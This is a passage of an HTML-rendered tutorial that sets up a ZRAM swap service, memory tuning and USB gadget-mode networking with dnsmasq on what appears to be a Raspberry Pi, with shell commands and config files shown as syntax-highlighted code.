$ZRAMDEV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;\t\t\tzramctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -r&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $ZRAMDEV&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;\t\tdone&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;\t&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;restart&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; )&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t$0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; stop&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt;\t\t$0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; start&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#AB5E3F;--shiki-dark:#C4704F&quot;&gt;\t-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; )&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;\t\techo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;USAGE: &lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;basename&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; (start|stop|restart)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t;;&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;esac&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Then create the systemd service file /etc/systemd/system/zram.service:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;ini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;ini&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Unit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Description&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;ZRAM-based virtual swap device&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Requires&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;systemd-modules-load.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Install&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;WantedBy&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;sysinit.target&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;[&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;Service&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;]&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;Type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;oneshot&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExecStart&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/local/sbin/zram.sh start&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;ExecStop&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;/usr/local/sbin/zram.sh stop&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#1E754F;--shiki-dark:#4D9375&quot;&gt;RemainAfterExit&lt;/span&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;=&lt;/span&gt;&lt;span style=&quot;--shiki-light:#393A34;--shiki-dark:#DBD7CAEE&quot;&gt;true&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;Finally, make sure that everything’s enabled.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make sure that the ZRAM module is loaded.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; zram&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/modules&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Make the zram.sh script executable.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;chmod&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; +x&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /usr/local/sbin/zram.sh&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Enable required services.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; daemon-reload&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;systemctl&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; enable&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; zram.service&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Encourage the kernel to preferentially clean up memory and&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# swap into ZRAM sooner.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;vm.vfs_cache_pressure=500&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/sysctl.conf&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;vm.swappiness=100&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/sysctl.conf&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;vm.dirty_background_ratio=1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/sysctl.conf&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;vm.dirty_ratio=50&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/sysctl.conf&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Drop permissions.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;exit&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;You should reboot after doing all of this.&lt;/p&gt;\n&lt;h2 id=&quot;network-access-and-usb-gadget-mode&quot;&gt;Network access and USB gadget mode&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#network-access-and-usb-gadget-mode&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Become root.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -s&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Install pre-requisits.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;apt&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; install&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dnsmasq&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Update firmware overlay and initramfs kernel modules.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;dtoverlay=dwc2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /boot/config.txt&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/initramfs-tools/modules&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#998418;--shiki-dark:#B8A965&quot;&gt;echo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; dwc2&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/initramfs-tools/modules&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create /etc/network/interfaces.d/usb0.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/network/interfaces.d/usb0&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;auto usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;allow-hotplug usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;iface usb0 inet static&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\taddress 10.55.0.1&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;\tnetmask 255.255.255.248&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Create /etc/dnsmasq.d/ipad.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;cat&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /etc/dnsmasq.d/ipad&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; &amp;#x3C;&amp;#x3C;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;interface=usb0&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;dhcp-range=10.55.0.2,10.55.0.6,255.255.255.248,1h&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;dhcp-option=3&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;dhcp-option=6&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;dhcp-authoritative&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;leasefile-ro&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt;EOF&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt; &lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;# Regenerate initramfs.&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A0ADA0;--shiki-dark:#758575DD&quot;&gt;#&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;mkinitramfs&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /boot/initramfs.zst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#999999;--shiki-dark:#666666&quot;&gt;\t$(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -1&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; /lib/modules&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#CB7676&quot;&gt; |&lt;/span&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt; grep&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -e&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#C98A7D77&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;-Re4son-v8l+$&lt;/span&gt;&lt;span 